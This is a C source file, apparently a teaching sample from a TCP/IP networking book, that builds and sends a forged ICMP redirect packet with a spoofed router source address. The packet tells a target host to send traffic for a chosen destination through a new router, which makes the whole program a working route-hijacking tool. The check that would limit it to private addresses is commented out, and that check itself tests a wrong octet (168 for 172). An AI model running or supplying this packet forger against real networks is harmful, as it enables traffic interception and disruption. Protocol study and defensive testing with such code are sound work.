/**********************************************************************
 *  *  ICMP再指引範例程式 (redirect.c)
 *   *        Ver 1.0 2001年7月10日
 *    *                                製作‧著作　村山公保(Yukio Murayama)
 *     *
 *      *  使用承諾書
 *       *    本程式只供學習TCP/IP協定以及提升網路程式設計的技能，
 *        *    可以原封不動地或加以修正地使用。禁止使用或改造本程式
 *         *    於違反法律或善良風俗的事物。本程式不做任何保證。因由
 *          *    本程式所產生的損害，著者不負擔任何責任。
 *           **********************************************************************/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in_systm.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#define __FAVOR_BSD
#include <netinet/udp.h>
#include <arpa/inet.h>

#define CHKADDRESS(_saddr_) \
{\
        u_char *p = (char *)&(_saddr_);\
        if ((p[0] == 10)\
                        || (p[0] == 168 && 16 <= p[1] && p[1] <= 31)\
                        || (p[0] == 192 && p[1] == 168) )\
        ;\
        else {\
                fprintf(stderr, "IP address error.\n");\
                exit(EXIT_FAILURE);\
        }\
}

enum {CMD_NAME, TARGET_IP, OLD_ROUTER, NEW_ROUTER, DST_IP};

void make_udp_header(struct udphdr *udp);
void make_ip_header(struct ip *ip, int target_ip, int dst_ip, int proto,
                int iplen);
void make_icmp5_header(struct icmp *icmp, u_int gw_ip);
u_short checksum(u_short * ptr, int nbytes);

int  main(int argc, char *argv[])
{
        struct sockaddr_in dest;   /* 終點主機址           */
        unsigned char buff[1500];  /* 發送緩衝器           */
        struct ip *ip_new;         /* 至IP起始碼的指標     */
        struct ip *ip_old;         /* 至IP起始碼的指標     */
        struct icmp *icmp;         /* 至ICMP起始碼的指標   */
        struct udphdr *udp;        /* 至UDP起始碼的指標    */
        int s;                     /* 接口檔案描述碼 */
        int size;                  /* 各種位元組數           */
        int on = 1;                /* ON                     */

        /* 檢查指令系列自變數 */
        if (argc != 5) {
                fprintf(stderr, "usage %s targetd_host old_router new_router dst_ip\n", 
                                argv[CMD_NAME]);
                exit(EXIT_FAILURE);
        }

        /* 打開RAW接口 */
        if ((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
                perror("socket(SOCK_RAW)");
                exit(EXIT_FAILURE);
        }

        if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char *) &on, sizeof(on)) < 0) {
                perror("setsockopt(IP_HDRINCL)");
                exit(EXIT_FAILURE);
        }

        /* 設定各個起始碼的指標 */
        /* IP(20) + ICMP(8) + IP(20) + UDP(8) */
        ip_new = (struct ip     *)(buff);
        icmp   = (struct icmp   *)(buff + 20);
        ip_old = (struct ip     *)(buff + 20 + 8);
        udp    = (struct udphdr *)(buff + 20 + 8 + 20);
        size = 20 + 8 + 20 + 8; 

        /* 製作封包 */
        make_udp_header(udp);
        make_ip_header(ip_old, inet_addr(argv[TARGET_IP]), inet_addr(argv[DST_IP]),
                        IPPROTO_UDP, 100);
        make_icmp5_header(icmp, inet_addr(argv[NEW_ROUTER]));
        make_ip_header(ip_new, inet_addr(argv[OLD_ROUTER]), 
                        inet_addr(argv[TARGET_IP]), IPPROTO_ICMP, size);

        /* 設定發送址 */
        memset((char *) &dest, 0, sizeof(dest));
        dest.sin_family      = AF_INET;
        dest.sin_addr.s_addr = inet_addr(argv[TARGET_IP]);
       // CHKADDRESS(dest.sin_addr.s_addr);

        /* 發送封包 */
        if (sendto(s, buff, size, 0, (struct sockaddr *) & dest, sizeof(dest)) < 0) {
                perror("sendto");
                exit(EXIT_FAILURE);
        }

        return EXIT_SUCCESS;
}

/*
 *  * void make_ip_header(struct ip *ip, int target_ip, int dst_ip, int proto, 
 *   *                     int iplen)
 *    * 功能
 *     *     製作IP起始碼
 *      * 自變數 
 *       *     struct ip *ip;  製作IP起始碼的前端址
 *        *     int target_ip;  發送端IP址
 *         *     int dst_ip;     發送端IP址
 *          *     int proto;      協定
 *           *     int iplen;      IP資料組的全長
 *            * 返送值
 *             *     無
 *              */
void make_ip_header(struct ip *ip, int target_ip, int dst_ip, int proto, 
                int iplen)
{
        memset((char *) ip, 0, sizeof(struct ip));

        /* 製作IP起始碼 */
        ip->ip_v   = IPVERSION;
        ip->ip_hl  = sizeof(struct ip) >> 2;
        ip->ip_id  = htons(0);
        ip->ip_off = 0;

#ifdef __linux
        /* Linux的Raw IP時 */
        ip->ip_len = htons(iplen);
        ip->ip_off = htons(IP_DF);
#else
        /* BSD的Raw IP時 */
        ip->ip_len = iplen;
        ip->ip_off = IP_DF;
#endif
        ip->ip_ttl = 2;
        ip->ip_p   = proto;
        ip->ip_src.s_addr = target_ip;
        ip->ip_dst.s_addr = dst_ip;

        /* 計算和核對 */
        ip->ip_sum = 0;
        ip->ip_sum = checksum((u_short *) ip, sizeof(struct ip));
}

/*
 *  * void make_icmp5_header(struct icmp *icmp, u_int gw_ip);
 *   * 功能
 *    *     製作ICMP第五型（再指引）起始碼
 *     * 自變數 
 *      *     struct icmp *icmp;  製作ICMP起始碼的前端址
 *       *     int n;              要求ICMP回覆的順序編號
 *        * 返送值
 *         *     無
 *          */
void make_icmp5_header(struct icmp *icmp, u_int gw_ip)
{
        icmp->icmp_type  = ICMP_REDIRECT;
        icmp->icmp_code  = ICMP_REDIRECT_HOST;
        icmp->icmp_gwaddr.s_addr = gw_ip;
        icmp->icmp_cksum = 0;
        icmp->icmp_cksum = checksum((u_short *)icmp, 8 + 20 + 8);
        /* ICMP(8) + IP(20) + UDP(8) */
}

/* 
 *  * void make_udp_header(struct udphdr *udp);
 *   * 功能
 *    *     製作UDP起始碼
 *     * 自變數 
 *      *     struct udphdr *udp;  製作UDP起始碼的前端址
 *       * 返送值
 *        *     無
 *         */
void make_udp_header(struct udphdr *udp)
{
        udp->uh_sport = htons(0);
        udp->uh_ulen  = htons((u_short) sizeof(struct udphdr));
        udp->uh_dport = htons(33434);
        udp->uh_sum   = htons(0);
}

/*
 *  * u_short checksum(u_short *data, int len);
 *   * 功能
 *    *     計算和核對
 *     * 自變數 
 *      *     u_short *data;   求取和核對資料
 *       *     int len;         資料的位元組數
 *        * 返送值
 *         *     u_short          和核對值（補數值）
 *          */
u_short checksum(u_short *data, int len)
{
        long sum = 0; /* 求取和核對值 */

        /* 每兩個位元組相加 */
        for (; len > 1; len -=2) {
                sum += *data++;
                if (sum & 0x80000000) 
                        sum = (sum & 0xffff) + (sum >> 16);
        }

        /* 資料長度為奇數位元組時的處理 */
        if (len == 1) {
                u_short i = 0;
                *(u_char*)(&i) = *(u_char *)data;
                sum += i;
        }

        /* 折返溢位 */
        while (sum >> 16)
                sum = (sum & 0xffff) + (sum >> 16);

        return ~sum;
}


